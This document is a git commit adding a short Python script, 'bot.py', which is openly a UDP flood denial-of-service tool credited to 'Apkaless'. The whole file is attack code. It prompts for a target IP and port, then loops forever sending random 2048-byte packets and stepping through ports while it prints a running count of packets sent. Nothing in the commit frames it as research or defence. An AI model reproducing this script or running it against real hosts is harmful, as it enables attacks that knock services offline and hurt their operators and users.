f870c7be99972134db92885e1721413cde32c640
jjajjajaaja <79743616+jjajjajaaja@users.noreply.github.com>
2021-02-27 03:01:32 -0600

    Create bot.py

---
+++ bot.py
@@ -0,0 +1,43 @@
+import sys
+import os
+import socket
+import random
+import time
+
+def DDosAttack():
+     os.system("figlet Apkaless")
+     time.sleep(2)
+     print("")
+     print("Creator  : Apkaless\n")
+     print("Country  : Iraq\n")
+     print("YouTube  : https://www.youtube.com/channel/UCghQ...​\n")
+
+     print("Facebook : https://www.facebook.com/Apkaless/​\n")
+     print("GitHub   : https://github.com/Apkaless​\n")
+     time.sleep(1)
+     
+     #########################################
+     
+     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+     bytes = random._urandom(2048)
+     
+     #########################################
+     
+     target_ip = input("Target ip: ")
+     print("")
+     time.sleep(1)
+     port = int(input("Port: "))
+     time.sleep(1)
+     sent = 0
+     os.system("clear")
+     os.system("figlet DDos Starting....")
+     time.sleep(2)
+     while True:
+         s.connect((target_ip,port))
+         s.sendto(bytes, (target_ip,port))
+         sent = sent + 1
+         port = port + 1
+         print("Attacking %s Packets To Target %s on Port %s By Apkaless" %(sent,target_ip,port))
+         if port == 66534:
+             port = 1
+DDosAttack()
